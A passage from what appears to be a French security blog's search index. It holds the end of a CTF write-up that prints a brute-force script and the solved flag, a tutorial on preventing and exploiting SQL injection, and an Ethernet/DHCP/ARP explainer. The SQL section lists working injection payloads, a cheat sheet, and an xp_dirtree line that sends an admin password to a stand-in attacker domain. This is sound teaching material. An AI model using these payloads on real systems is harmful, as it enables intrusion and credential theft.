r'(\\d+)(?=\\*x|\\s*$)' # Extraction des coefficientscoefficients = re.findall(pattern, polynomial_str)# Conversion des coefficients en entiers pour un usage ultérieurcoefficients = [int(coef) for coef in coefficients]print(\"Coefficients extraits :\", coefficients)def bruteforce_segment(coefficient):\t# Génère toutes les combinaisons de 4 caractères possibles dans le charset\tfor candidate in product(charset, repeat=4):\t\tsegment = bytes(candidate)\t\t#print(segment)\t\t# Calcul du hachage SHA-256 du segment\t\tif int(hashlib.sha256(segment).hexdigest(), 16) == coefficient:\t\t\tprint(segment)\t\t\treturn segment\treturn None# Reconstruction du flagflag_segments = []for coef in reversed(coefficients):\tsegment = bruteforce_segment(coef)\tif segment:\t\tflag_segments.append(segment)\telse:\t\tprint(\"Segment introuvable pour un coefficient.\")\t\tbreak# Assemble le flag final en concaténant les segments et ajout du préfixeflag = b''.join(flag_segments)try: print(\"Reconstructed flag:\", flag.decode('utf-8'))except UnicodeDecodeError: print(\"Reconstructed flag contains invalid UTF-8 characters.\") print(\"Flag (raw bytes):\", flag)python brute_force_flag.pyFlag reconstitué : Hero{th3r3_4r3_tw0_typ35_0f_p30pl3_1n_th15_w0rld_th053_wh0_c4n_3xtr4p0l4t3_fr0m_1nc0mpl3t3_d474}" }, { "title": "Notes | SQL Injections", "url": "/Notes/Web/sql_injections", "categories": "Notes, Web", "tags": "Notes, Web", "date": "2024-10-20 00:00:00 +0200", "snippet": "Qu’est-ce qu’une injection SQL (SQLi) ?Une injection SQL (SQLi) est une vulnérabilité web critique qui permet à un attaquant d’envoyer des requêtes malveillantes à la base de données d’une application. Cette attaque est possible lorsque les entrées utilisateur, telles que les champs de formulaire, les URL, ou même les cookies, sont intégrées directement dans les requêtes SQL sans être correctement validées ou sécurisées.Une injection SQL permet à un attaquant de contourner les contrôles de sécurité et d’exécuter des actions telles que : Accéder à des informations sensibles stockées dans la base de données (par exemple, des identifiants d’utilisateur, des mots de passe). Modifier, insérer ou supprimer des données dans la base de données. Contourner des mécanismes d’authentification ou d’autorisation. Dans certains cas, compromettre complètement le serveur de la base de données ou d’autres composants du système backend.Quand survient une injection SQL ?Une injection SQL survient lorsque des entrées utilisateur non sécurisées sont utilisées pour construire dynamiquement une requête SQL. Cela se produit lorsque l’application n’échappe pas correctement les données d’entrée ou n’utilise pas de requêtes paramétrées pour gérer les données soumises par l’utilisateur.Par exemple, supposons qu’une application interroge une base de données pour récupérer des produits en fonction d’une catégorie spécifiée dans une URL :https://exemple.com/produits?categorie=ElectroniqueL’URL entraîne la génération de la requête SQL suivante :SELECT * FROM produits WHERE categorie = 'Electronique';Si l’application ne valide pas correctement la catégorie fournie dans l’URL, un attaquant pourrait modifier cette URL comme suit :https://exemple.com/produits?categorie=Electronique' OR 1=1-- -Cela entraînerait la génération de la requête SQL suivante :SELECT * FROM produits WHERE categorie = 'Electronique' OR 1=1-- -;Dans cet exemple, la condition OR 1=1 est toujours vraie, ce qui permettrait à l’attaquant de contourner la restriction sur la catégorie des produits et de récupérer l’ensemble des produits, qu’elle que soit la catégorie. Ce genre d’attaque survient fréquemment lorsqu’une application ne valide pas ou ne filtre pas correctement les données entrantes.Comment se protéger contre les injections SQL ?Il existe plusieurs mesures de prévention pour se protéger efficacement contre les injections SQL. En voici les principales :## 1. Utilisation de requêtes paramétrées (Prepared Statements)Les requêtes paramétrées sont la méthode la plus efficace pour prévenir les injections SQL. Au lieu de construire dynamiquement une requête SQL en concaténant des chaînes de caractères avec des données utilisateur, les requêtes paramétrées utilisent des paramètres de requête. Ces paramètres garantissent que les données utilisateur sont traitées comme des valeurs littérales et non comme du code exécutable. Cela permet d’indiquer à la base de données la structure de la requête attendue.Voici un exemple en Java d’une requête vulnérable :String query = \"SELECT * FROM produits WHERE categorie = '\" + input + \"'\";Statement statement = connection.createStatement();ResultSet resultSet = statement.executeQuery(query);Dans cet exemple, la variable input, qui contient la valeur de la catégorie, est directement injectée dans la requête SQL. Si input contient du code malveillant, il sera exécuté.Pour sécuriser cette requête, il est préférable d’utiliser une requête paramétrée :PreparedStatement stmt = connection.prepareStatement(\"SELECT * FROM produits WHERE categorie = ?\");stmt.setString(1, input);ResultSet rs = stmt.executeQuery();Dans ce cas, input est passé en tant que paramètre à la requête. La structure de la requête est donc protégée, et toute tentative d’injection SQL sera automatiquement neutralisée par la base de données elle-même.2. Validation et échappement des entrées utilisateurLorsque l’utilisation de requêtes paramétrées n’est pas possible, il est essentiel de valider et d’échapper correctement toutes les entrées utilisateur. Cela inclut l’échappement de caractères spéciaux comme les guillemets simples (‘), les guillemets doubles (“) et d’autres caractères susceptibles de modifier la syntaxe SQL.Cependant, cette méthode est plus fragile que l’utilisation de requêtes paramétrées, car elle dépend de la gestion correcte de chaque point d’entrée utilisateur et des mécanismes d’échappement spécifiques à chaque base de données. Ainsi, même si l’échappement est important, il doit être utilisé en complément de méthodes plus robustes comme les requêtes paramétrées.3. Utiliser des privilèges limitésIl est également recommandé de limiter les privilèges des comptes utilisés pour interagir avec la base de données. Par exemple, un compte utilisé pour accéder aux données d’un utilisateur ne devrait pas avoir les privilèges nécessaires pour supprimer ou modifier les données de la base de données.En utilisant des comptes à privilèges réduits, vous limitez les dégâts potentiels d’une injection SQL. Si un attaquant parvient à exploiter une injection SQL, les actions qu’il pourra effectuer seront restreintes aux permissions attribuées à ce compte.4. Utiliser des pare-feux d’applications web (WAF)Les pare-feux d’applications web peuvent détecter et bloquer certaines attaques d’injection SQL. Ils fonctionnent en analysant les requêtes HTTP et en détectant les modèles de comportement malveillant. Bien que les WAF ne soient pas une solution complète, ils fournissent une couche de protection supplémentaire contre les attaques connues.# Exploitation des injections SQLInjection SQL basée sur l’UNION (UNION-based SQL Injection)L’injection SQL basée sur l’UNION permet à un attaquant de combiner les résultats de plusieurs requêtes SQL en utilisant l’opérateur UNION. Cette technique permet d’extraire des données supplémentaires d’une base de données en ajoutant des résultats à ceux déjà renvoyés par la requête d’origine.Pour exploiter cette technique, il est nécessaire que le résultat de la requête soit renvoyé.Principe de l’injection UNIONL’opérateur UNION permet de combiner deux requêtes SELECT et d’afficher les résultats dans une même réponse. Pour que cette technique fonctionne, il est nécessaire que : Le nombre de colonnes dans les requêtes combinées soit identique. Les types de données des colonnes soient compatibles entre les deux requêtes.Étapes de l’exploitation1. Déterminer le nombre de colonnesL’une des premières étapes pour exploiter une injection UNION consiste à déterminer combien de colonnes sont renvoyées par la requête initiale. Cela peut être fait en utilisant une série de requêtes ORDER BY jusqu’à ce qu’une erreur soit générée, indiquant que le nombre maximal de colonnes a été dépassé :' ORDER BY 1-- -' ORDER BY 2-- -' ORDER BY 3-- -Lorsque l’index dépasse le nombre réel de colonnes, l’application génère une erreur, ce qui permet à l’attaquant de déterminer le nombre exact de colonnes.2. Trouver les colonnes compatibles avec des chaînesAprès avoir déterminé le nombre de colonnes, l’étape suivante consiste à tester quelles colonnes acceptent des chaînes de caractères. Cela est crucial pour permettre à l’attaquant de récupérer des informations sensibles comme des noms d’utilisateurs ou des mots de passe. On injecte des valeurs de test telles que ‘a’ dans chaque colonne tour à tour :' UNION SELECT 'a', NULL, NULL-- -' UNION SELECT NULL, 'a', NULL-- -' UNION SELECT NULL, NULL, 'a'-- - On notera que NULL est compatible avec tout les types de données.Exemple d’injection UNIONL’exemple est fait sur une base de données PostgreSQL. La syntaxe change en fonction de la base de données utilisée. Récupérer la version de la base de données :' UNION SELECT NULL, VERSION()-- - Récupérer le nom des bases de données :' UNION SELECT NULL, CURRENT_DATABASE()-- - Lister les tables de la base de données :' UNION SELECT NULL, string_agg(concat(table_name), ',') FROM information_schema.tables-- - Lister les colonnes de la table ‘users’ :' UNION SELECT NULL, string_agg(concat(column_name), ',') FROM information_schema.columns WHERE table_name = 'users'-- - Récupérer les informations d’un utilisateur :' UNION SELECT NULL,string_agg(concat(username, ',', password), '; '),NULL from users-- - Injection SQL aveugle basée sur les conditions (Boolean-based Blind SQL Injection)L’injection SQL aveugle basée sur les conditions est utilisée lorsque l’application ne renvoie pas de résultats visibles mais que l’on peut exploiter la différence de comportement de l’application en fonction de la validité d’une condition. Ici, l’attaquant teste différentes conditions logiques et observe les variations dans les réponses de l’application (comme la présence ou l’absence d’une page d’erreur).Fonctionnement de l’injection booléenneL’attaquant envoie une requête SQL avec une condition booléenne, telle que :' AND 1=1-- -Cette condition est toujours vraie, donc l’application répondra normalement. Si une condition fausse est injectée, comme :' AND 1=2-- -et que l’application renvoie une erreur ou un comportement différent, cela indique que la requête SQL a bien été traitée.L’attaquant peut ensuite tester des conditions spécifiques pour extraire des informations. Par exemple, il pourrait injecter une condition pour tester le premier caractère du nom d’utilisateur :' AND SUBSTRING(username, 1, 1) = 'a'-- -Si l’application réagit différemment, cela signifie que le premier caractère est ‘a’. Ce processus peut être répété pour chaque caractère jusqu’à ce que l’attaquant ait récupéré l’intégralité du nom d’utilisateur ou d’autres données sensibles. On notera qu’il est possible d’utiliser la dichotomie pour accélérer l’exploitation des blind SQL injections.Exemple de dichotomie:' OR ASCII(SUBSTRING((SELECT version() LIMIT 1 OFFSET 0), 1, 1)) &gt;= 64-- - ' Ici l’attaquant utilise la fonction ASCII pour convertir le premier caractère de la version de la base de données en code ASCII. Il utilise ensuite la condition ASCII(SUBSTRING((SELECT version() LIMIT 1 OFFSET 0), 1, 1)) &gt;= 64 pour tester si le code ASCII est supérieur ou égal à 64. Ainsi on peut diviser par 2 le nombre de caractères à chaque requête au lieu de tester tous les caractères.Injection SQL aveugle basée sur le temps (Time-based Blind SQL Injection)Dans certaines applications, les différences de comportement ne sont pas visibles directement dans les réponses de l’application (par exemple, l’application ne renvoie pas d’erreurs ni de résultats différents). Cependant, il est possible de mesurer les délais de réponse pour déterminer si une condition est vraie ou fausse. Ce type d’attaque est appelé injection SQL aveugle basée sur le temps.Fonctionnement de l’injection basée sur le tempsL’idée derrière une injection SQL basée sur le temps est d’utiliser des commandes SQL qui introduisent des délais artificiels lorsque certaines conditions sont vraies. En mesurant le temps de réponse de l’application, l’attaquant peut inférer si la condition est vraie ou fausse.Prenons l’exemple d’une base de données PostgreSQL. L’attaquant pourrait injecter la commande suivante :'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -Cette injection teste la condition 1=1, qui est toujours vraie. Si la condition est vraie, la requête introduit un délai de 5 secondes (pg_sleep(5)). Si la condition est fausse, il n’y a aucun délai.L’attaquant peut donc utiliser cette méthode pour tester des conditions plus spécifiques. Par exemple, pour déterminer si le premier caractère du nom d’utilisateur est ‘a’, l’attaquant pourrait injecter :'; SELECT CASE WHEN SUBSTRING(username, 1, 1) = 'a' THEN pg_sleep(5) ELSE pg_sleep(0) END-- -Si la requête prend 5 secondes à répondre, cela indique que le premier caractère est bien ‘a’. Sinon, l’attaquant sait que la condition est fausse et peut continuer à tester d’autres caractères. Ce type d’exploitation étant longue, l’utilisation de la dichotomie est recommandée pour accélérer l’exploitation.Dichotomie:; SELECT CASE WHEN (ASCII(SUBSTR((SELECT version() LIMIT 1 OFFSET 1), 1, 1)) &gt;= 64) THEN pg_sleep(3) ELSE pg_sleep(0) END-- - L’application doit utiliser des requêtes SQL synchrones (la requête attend une réponse de la base de données avant de poursuivre). Sinon cette technique ne fonctionnera pas.Injection SQL basée sur les erreurs (Error-based SQL Injection)L’injection SQL basée sur les erreurs exploite les messages d’erreur générés par la base de données pour obtenir des informations sur la structure et le contenu de la base de données. Cette méthode est particulièrement efficace lorsque l’application renvoie des messages d’erreur détaillés dans les réponses HTTP.Fonctionnement de l’injection basée sur les erreursCertaines bases de données, lorsqu’elles rencontrent des erreurs de syntaxe SQL, renvoient des messages d’erreur contenant des informations précieuses pour un attaquant. Par exemple, un message d’erreur pourrait révéler la structure d’une requête SQL ou même afficher des données internes de la base de données.Prenons l’exemple suivant :SELECT * FROM users WHERE username = 'admin';Si l’attaquant injecte un guillemet non échappé (‘) :'admin'cela pourrait générer une erreur de syntaxe SQL comme :Erreur : syntaxe incorrecte près de 'admin'.Ce type d’information permet à l’attaquant de comprendre la structure de la requête et d’ajuster ses injections en conséquence.Dans des cas plus complexes, les messages d’erreur peuvent également être utilisés pour extraire directement des informations sensibles. Par exemple, si une base de données PostgreSQL tente de convertir une chaîne de caractères en un type de données incorrect, elle peut renvoyer un message d’erreur contenant la chaîne de caractères elle-même. Un attaquant pourrait exploiter ce comportement pour extraire des données sensibles :' UNION SELECT CAST((SELECT username FROM users LIMIT 1) AS int)-- -Cette requête tente de convertir le nom d’utilisateur en entier, ce qui entraîne une erreur :Erreur : conversion impossible de la chaîne 'admin' en type int.L’attaquant peut ainsi voir le contenu du champ username à travers le message d’erreurInjection SQL hors bande (Out-of-band SQL Injection)L’injection SQL hors bande est une méthode plus avancée utilisée lorsque l’application ne renvoie pas directement les résultats de la requête SQL et qu’il n’est pas possible de mesurer les différences de comportement ou de temps. Au lieu de cela, l’attaquant utilise des canaux de communication alternatifs, tels que des requêtes DNS, pour extraire des données. On ne peut pas mesurer de différence temps car les requêtes sont faite de manière asynchrone.### Fonctionnement de l’injection hors bandeL’idée derrière l’injection hors bande est d’utiliser des fonctionnalités de la base de données pour envoyer des informations à un serveur contrôlé par l’attaquant. Par exemple, certaines bases de données permettent d’effectuer des requêtes DNS ou HTTP à des serveurs distants. L’attaquant peut alors injecter des requêtes SQL qui envoient les données extraites vers son propre serveur.Prenons l’exemple d’une base de données Microsoft SQL Server. L’attaquant pourrait injecter la commande suivante :'; exec master..xp_dirtree '//attacker-domain.com/a'--Cette requête fait en sorte que le serveur de base de données effectue une requête DNS vers attacker-domain.com, ce qui permet à l’attaquant de détecter cette interaction et de confirmer que son injection a réussi.Dans des attaques plus complexes, l’attaquant peut utiliser cette méthode pour exfiltrer directement des données en encodant les résultats de la requête SQL dans des requêtes DNS. Par exemple, il pourrait exfiltrer un mot de passe utilisateur de cette manière :'; declare @p varchar(1024); set @p = (SELECT password FROM users WHERE username = 'admin'); exec('master..xp_dirtree ''//' + @p + '.attacker-domain.com/a''')--Cette requête envoie le mot de passe de l’utilisateur admin sous forme de sous-domaine DNS vers le serveur contrôlé par l’attaquant.Avantages et inconvénientsL’injection SQL hors bande est une méthode puissante car elle fonctionne même lorsque les réponses HTTP ou les délais ne peuvent pas être observés. Cependant, elle nécessite souvent des fonctionnalités spécifiques du serveur de base de données, telles que l’accès à des commandes spécifiques (comme xp_dirtree sur SQL Server) ou la possibilité d’effectuer des requêtes externes. Si ces fonctionnalités sont désactivées ou filtrées, cette méthode devient inefficace.Cheat SheetVersion de la base de données Database Payload Oracle SELECT banner FROM v$version; SELECT version FROM v$instance; Microsoft SELECT @@version PostgreSQL SELECT version() MySQL SELECT @@version Nom de la base de données Database Payload Oracle SELECT name FROM v$database; Microsoft SELECT DB_NAME(); PostgreSQL SELECT current_database(); MySQL SELECT DATABASE(); Nom des tables Database Payload Oracle SELECT owner, table_name FROM all_tables; SELECT table_name FROM user_tables; Microsoft SELECT table_name FROM information_schema.tables WHERE table_type = ‘BASE TABLE’; SELECT name FROM sys.tables; PostgreSQL SELECT table_name FROM information_schema.tables WHERE table_schema = ‘public’ AND table_type = ‘BASE TABLE’; MySQL SELECT table_name FROM information_schema.tables WHERE table_schema = ‘nom_de_la_base’ AND table_type = ‘BASE TABLE’; Nom des colonnes Database Payload Oracle SELECT column_name FROM user_tab_columns WHERE table_name = ‘NOM_DE_LA_TABLE’; Microsoft SELECT column_name FROM information_schema.columns WHERE table_name = ‘NomDeLaTable’; PostgreSQL SELECT column_name FROM information_schema.columns WHERE table_name = ‘NomDeLaTable’; MySQL SELECT column_name FROM information_schema.columns WHERE table_schema = ‘nom_de_la_base’ AND table_type = ‘BASE TABLE’; Conditionnal Error based Database Payload Oracle Test: SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual Version: SELECT CASE WHEN (ASCII(SUBSTR(banner, {index}, 1))&gt;={mid}) THEN TO_CHAR(1/0) ELSE ‘’ END FROM v$version where ROWNUM={offset} Tables: SELECT CASE WHEN (ascii(substr(table_name, {index}, 1))&gt;={mid}) THEN TO_CHAR(1/0) ELSE ‘’ END FROM user_tables where ROWNUM={offset} Colonnes: SELECT CASE WHEN (ascii(substr(column_name, {index}, 1)) &gt;= {mid}) THEN TO_CHAR(1/0) ELSE ‘’ END FROM (SELECT column_name FROM (SELECT column_name, ROWNUM AS rn FROM USER_TAB_COLUMNS WHERE table_name = ‘USERS’ AND ROWNUM &lt;= {offset}) WHERE rn = {offset}) Dump: SELECT CASE WHEN (ascii(substr(password, {index}, 1)) &gt;= {mid}) THEN TO_CHAR(1/0) ELSE ‘’ END FROM (SELECT username, password FROM (SELECT username, password, ROWNUM AS rn FROM users WHERE username = ‘administrator’ AND ROWNUM &lt;= {offset}) WHERE rn = {offset}) Microsoft SELECT CASE WHEN (Condition) THEN 1/0 ELSE NULL END PostgreSQL 1 = (SELECT CASE WHEN (CONDITION) THEN 1/(SELECT 0) ELSE NULL END) MySQL SELECT IF(CONDITION,(SELECT table_name FROM information_schema.tables),’a’) Error messages Database Payload Microsoft SELECT ‘foo’ WHERE 1 = (SELECT ‘secret’) &gt; Conversion failed when converting the varchar value ‘secret’ to data type int. PostgreSQL SELECT CAST((SELECT password FROM users LIMIT 1) AS int) &gt; invalid input syntax for integer: “secret” MySQL SELECT ‘foo’ WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT ‘secret’))) &gt; XPATH syntax error: ‘\\secret’ Batched queriesREQUETE1;REQUETE2 Oracle ne supporte pas les requêtes multiples. Avec MySQL, les requêtes groupées ne peuvent généralement pas être utilisées pour des injections SQL. Cependant, cela est parfois possible si l’application cible utilise certaines API PHP ou Python pour communiquer avec une base de données MySQL.Time-based Database Payload     Oracle SELECT CASE WHEN (CONDITION) THEN ‘a’   dbms_pipe.receive_message((‘a’),10) ELSE NULL END FROM dual Microsoft IF (CONDITION) WAITFOR DELAY ‘0:0:10’     PostgreSQL SELECT CASE WHEN (CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END     MySQL SELECT IF(CONDITION,SLEEP(10),’a’)     Sources https://portswigger.net/web-security/sql-injection https://portswigger.net/web-security/sql-injection/cheat-sheet https://tryhackme.com/r/room/sqlinjectionlm" }, { "title": "Notes | Reseau | Connexion Ethernet", "url": "/Notes/Reseau/connexion_ethernet", "categories": "Notes, Systeme, Réseau", "tags": "Notes, Systeme, Réseau", "date": "2024-10-05 00:00:00 +0200", "snippet": "La connexion via un câble Ethernet déclenche une série de processus essentiels pour établir une communication réseau rapide et stable. De la détection du câble par la carte réseau à l’attribution d’une adresse IP, chaque étape implique une interaction entre le matériel et les protocoles réseau. Cet article détaille ces étapes pour les systèmes Linux et Windows, afin de comprendre comment les appareils réseau fonctionnent en pratique.1. Détection Physique du Câble EthernetLe processus de connexion Ethernet débute avec la détection physique du câble par la carte réseau (NIC).Interaction matérielle : La carte réseau surveille l’état des broches de son port RJ45. Lorsqu’un câble est inséré, un changement de tension est détecté sur les broches, signalant la présence d’un autre appareil connecté (généralement un commutateur ou un routeur).Signaux de Link Pulse : Une fois le câble détecté, la carte réseau envoie et reçoit des signaux appelés link pulse. Ces impulsions (NLP pour les réseaux de base et FLP pour les réseaux rapides) vérifient la continuité de la connexion. Ces signaux permettent de déterminer si le câble est correctement connecté à un appareil actif de l’autre côté.Interruptions matérielles (IRQ) : Lorsque la carte réseau détecte un lien actif, elle génère une interruption matérielle (IRQ) pour notifier le système d’exploitation. Cette interruption est traitée par le pilote de la carte réseau, permettant au système de prendre en compte la nouvelle connexion réseau.2. Autonegotiation : Négociation de la Vitesse et de la DuplexitéAprès la détection du lien, la carte réseau et l’appareil connecté procèdent à une négociation des paramètres de connexion via le protocole d’autonégociation.Autonégociation (IEEE 802.3u) : Ce protocole permet aux appareils de négocier automatiquement les meilleures conditions de communication, notamment la vitesse et le mode de duplex. Ils échangent des messages de Link Pulse pour déterminer leurs capacités respectives.Négociation de la vitesse : Les cartes réseau modernes peuvent fonctionner à des vitesses variées (10 Mbps, 100 Mbps, 1 Gbps, etc.). Les deux appareils échangent leurs capacités et choisissent la vitesse la plus élevée supportée par les deux. Par exemple, si la carte réseau et le commutateur supportent 1 Gbps, ils établiront la connexion à cette vitesse.Mode Duplex : La négociation détermine également si la connexion se fera en half-duplex (où un appareil envoie ou reçoit des données, mais pas les deux simultanément) ou en full-duplex (où les deux peuvent envoyer et recevoir en même temps). Le mode full-duplex est souvent préféré pour éviter les collisions et optimiser les performances.3. Activation de l’Interface Réseau au Niveau du SystèmeSous LinuxAprès le branchement d’un câble Ethernet, l’activation de l’interface réseau sous Linux est généralement automatisée, mais le processus peut varier selon la configuration du système et les outils utilisés pour la gestion réseau.Avec NetworkManagerLa plupart des distributions Linux de bureau modernes utilisent NetworkManager pour gérer les interfaces réseau de manière automatique. Voici ce qui se passe lorsque le câble Ethernet est branché :Détection du lien : NetworkManager détecte la présence d’un câble connecté à l’interface réseau (par exemple eth0 ou enp3s0). Cette détection repose sur les signaux de Link Pulse échangés entre la carte réseau et l’équipement de l’autre côté du câble (comme un commutateur).Activation automatique de l’interface : Si l’interface est configurée pour démarrer automatiquement (ce qui est le cas par défaut), NetworkManager envoie une commande au noyau pour activer l’interface, l’équivalent de la commande :ip link set dev eth0 upÀ ce stade, l’interface est active et prête à envoyer et recevoir des paquets.Configuration IP via DHCP : Après l’activation de l’interface, NetworkManager tente de récupérer une adresse IP via le protocole DHCP si l’interface est configurée pour cela. Cela implique l’envoi d’une requête DHCP Discover sur le réseau pour obtenir les informations nécessaires (adresse IP, passerelle par défaut, serveurs DNS).Si un serveur DHCP est trouvé, l’adresse IP est automatiquement attribuée à l’interface, rendant la machine accessible sur le réseau local.Surveillance de l’état de la connexion : NetworkManager continue de surveiller l’état de la connexion. Si le câble Ethernet est débranché, il désactivera automatiquement l’interface et cherchera une autre connexion disponible (comme le Wi-Fi).Utilisation de Systemd-networkdPour les systèmes sans NetworkManager, comme certains serveurs, systemd-networkd est souvent utilisé pour gérer les interfaces réseau :Configuration via fichiers .network : Les interfaces réseau peuvent être configurées dans le répertoire /etc/systemd/network/. Un fichier typique pour une interface Ethernet utilisant DHCP pourrait ressembler à ceci :[Match]Name=eth0[Network]DHCP=yesAvec cette configuration, dès que le câble Ethernet est branché, systemd-networkd active automatiquement l’interface eth0 et envoie une requête DHCP pour obtenir une adresse IP.Activation automatique au démarrage : Les interfaces configurées de cette manière sont activées au démarrage du système, et leur état est surveillé en permanence par systemd-networkd, qui gère les changements de connexion.Gestion manuelle avec ip et dhclientSur les systèmes minimalistes ou dépourvus de services de gestion de réseau comme NetworkManager ou systemd-networkd, l’activation de l’interface doit être effectuée manuellement :Activer l’interface : Pour activer une interface nommée eth0, il faut utiliser la commande :sudo ip link set dev eth0 upCela rend l’interface active, mais elle n’a pas encore d’adresse IP attribuée.Obtenir une adresse IP via DHCP : Pour obtenir une adresse IP, il est possible d’utiliser le client DHCP dhclient :sudo dhclient eth0Cette commande envoie une requête DHCP Discover sur le réseau pour récupérer une adresse IP, une passerelle et des serveurs DNS, comme le ferait NetworkManager.Configuration IP statique : Si une adresse IP statique est préférée, elle peut être attribuée manuellement avec :sudo ip addr add 192.168.1.100/24 dev eth0Cette commande configure l’adresse IP 192.168.1.100 avec un masque de sous-réseau de 255.255.255.0 sur l’interface eth0.Sur Linux, l’activation de l’interface réseau Ethernet après le branchement d’un câble est souvent gérée automatiquement par des services comme NetworkManager ou systemd-networkd. Ces outils simplifient la gestion réseau en configurant et surveillant les interfaces. Cependant, pour des configurations plus légères ou spécifiques aux serveurs, l’activation et la configuration peuvent être réalisées à la main, offrant ainsi un contrôle plus fin sur les paramètres réseau.Sous WindowsAprès le branchement d’un câble Ethernet sur un système Windows, l’activation de l’interface réseau est largement automatisée. Windows dispose de plusieurs mécanismes pour gérer cette activation de manière transparente pour l’utilisateur, en utilisant des services intégrés et des pilotes compatibles.Automatisation via Plug-and-Play (PnP)Détection du périphérique : Lorsque le câble Ethernet est connecté à la carte réseau, Windows détecte le changement de l’état du lien grâce à la fonctionnalité Plug-and-Play (PnP). Le système d’exploitation détecte l’activité sur le port Ethernet et identifie la carte réseau connectée.Chargement du pilote réseau : Si le périphérique est correctement reconnu, Windows charge le pilote de la carte réseau. Ce pilote, souvent installé automatiquement lors de la première installation de la carte réseau, permet au système de communiquer avec le matériel réseau de manière standardisée.Configuration via NDIS (Network Driver Interface Specification)Windows utilise le modèle NDIS pour gérer les interactions entre les pilotes de la carte réseau et le système d’exploitation :Interface standardisée : NDIS fournit une interface standard entre le système d’exploitation et les pilotes de la carte réseau, ce qui permet à Windows de gérer des cartes de différents constructeurs de manière uniforme.Gestion des buffers et interruptions : Le pilote, en coopération avec NDIS, configure les buffers en mémoire pour stocker les paquets réseau entrants et sortants et gère les interruptions matérielles (IRQ) pour notifier le système lorsque des paquets sont reçus ou lorsqu’un problème survient.Activation de l’interface réseau par les services WindowsUne fois la carte réseau détectée et le pilote chargé, Windows active automatiquement l’interface réseau :Service Network Connections : Windows utilise le service Network Connections pour gérer les interfaces réseau. Ce service est responsable de l’activation des interfaces lorsqu’un lien est détecté, rendant l’interface prête à l’emploi sans intervention manuelle.Configuration IP via DHCP : Par défaut, Windows configure les interfaces Ethernet pour obtenir une adresse IP de manière dynamique via DHCP. Lorsque le service Network Connections détecte que l’interface est active, il envoie une requête DHCP Discover pour obtenir une adresse IP, un masque de sous-réseau, une passerelle et les serveurs DNS.Si un serveur DHCP est disponible sur le réseau, il répond avec une adresse IP et d’autres paramètres, que Windows applique automatiquement à l’interface. Cela permet à la machine de devenir immédiatement accessible sur le réseau.Surveillance de l’état de la connexion : Windows continue de surveiller l’état de la connexion Ethernet via le Centre Réseau et Partage. Si le câble est débranché ou si la connexion échoue, l’interface est automatiquement désactivée et passe en mode “câble débranché”.Activation manuelle de l’interface réseauBien que la plupart des processus soient automatisés, il est possible pour un utilisateur d’activer ou de désactiver manuellement une interface réseau à partir de l’interface graphique ou de la ligne de commande :Interface graphique : L’utilisateur peut activer ou désactiver une interface réseau via le Panneau de configuration en accédant à :Panneau de configuration &gt; Réseau et Internet &gt; Connexions réseauEn cliquant avec le bouton droit sur l’interface Ethernet concernée, l’utilisateur peut choisir “Activer” ou “Désactiver” selon le besoin.PowerShell : Pour les utilisateurs avancés, il est possible d’activer une interface réseau via PowerShell :Enable-NetAdapter -Name \"Ethernet\"Cette commande active l’interface réseau nommée “Ethernet”. L’interface devient alors disponible pour envoyer et recevoir des paquets, et si elle est configurée pour utiliser DHCP, elle tente immédiatement d’obtenir une adresse IP.Invite de commande : La commande ipconfig /renew permet de forcer une requête DHCP pour obtenir une nouvelle adresse IP pour une interface active :ipconfig /renewCette commande est utile lorsque l’interface est déjà active mais a besoin de renouveler son bail DHCP ou si le serveur DHCP n’a pas répondu correctement lors de la première demande.Sous Windows, l’activation de l’interface réseau après le branchement d’un câble Ethernet est conçue pour être transparente et automatisée. Grâce à des services comme Plug-and-Play et Network Connections, le système d’exploitation gère l’activation, la configuration et la surveillance des interfaces réseau sans nécessiter d’intervention manuelle. Cependant, les options de configuration via PowerShell et l’interface graphique permettent de garder un contrôle manuel pour les utilisateurs avancés ou dans des situations de dépannage.4. Attribution d’une Adresse IP via DHCPSi la machine n’a pas d’adresse IP statique préconfigurée, elle utilise le protocole DHCP (Dynamic Host Configuration Protocol) pour obtenir une adresse IP de manière dynamique.Découverte DHCP (DHCP Discover) : La machine envoie un message DHCP Discover en broadcast pour trouver un serveur DHCP sur le réseau. Ce message est diffusé à l’adresse IP spéciale 255.255.255.255 pour s’assurer qu’il est reçu par tous les appareils du réseau, et en particulier par le serveur DHCP.Offre DHCP (DHCP Offer) : Le serveur DHCP répond avec un message DHCP Offer, qui propose une adresse IP, un masque de sous-réseau, une passerelle par défaut, et les serveurs DNS.Demande DHCP (DHCP Request) : La machine répond à cette offre en envoyant un message DHCP Request en broadcast, confirmant qu’elle accepte l’adresse IP proposée. Ce processus empêche d’autres serveurs DHCP sur le réseau de tenter d’attribuer la même adresse IP à un autre appareil.Accusé de réception DHCP (DHCP Ack) : Le serveur DHCP finalise le processus en envoyant un message DHCP Ack, confirmant la réservation de l’adresse IP pour une durée déterminée (le bail DHCP). La machine configure alors son adresse IP et les autres paramètres réseau reçus.5. Envoi des Trames ARP pour Découvrir le RéseauAprès l’activation de l’interface, la machine doit identifier les autres appareils sur le réseau local, et c’est ici qu’intervient le protocole ARP (Address Resolution Protocol).Fonctionnement de l’ARP : Chaque appareil sur un réseau local possède une adresse MAC (Media Access Control), une adresse physique unique attribuée à sa carte réseau. Pour envoyer des données à un appareil sur le même réseau, la machine doit connaître l’adresse MAC associée à l’adresse IP cible.Requête ARP : La machine envoie une trame ARP en broadcast à tous les appareils du réseau local : “Qui a l’adresse IP X ?”. Cela signifie qu’elle cherche l’adresse MAC de l’appareil ayant l’adresse IP X. Cette trame est envoyée à l’adresse MAC spéciale ff:ff:ff:ff:ff:ff, qui signifie que tous les appareils sur le réseau doivent la traiter.Réponse ARP : L’appareil qui possède l’adresse IP X répond en envoyant une trame ARP en unicast, directement à l’expéditeur, contenant son adresse MAC. Ainsi, la machine émettrice peut associer l’adresse IP à l’adresse MAC dans son cache ARP.Cache ARP : Pour éviter de refaire une requête ARP à chaque fois qu’elle souhaite communiquer avec la même adresse IP, la machine stocke cette correspondance dans un cache ARP. Ce cache a une durée de vie limitée, et les entrées expirent après un certain temps, ce qui permet de garder les informations à jour.ConclusionBrancher un câble Ethernet déclenche une chaîne d’événements impliquant des interactions entre matériel, logiciels systèmes et protocoles réseau. Chaque étape contribue à l’établissement d’une connexion réseau stable et performante. Comprendre ces mécanismes en profondeur est crucial pour toute personne travaillant dans l’administration 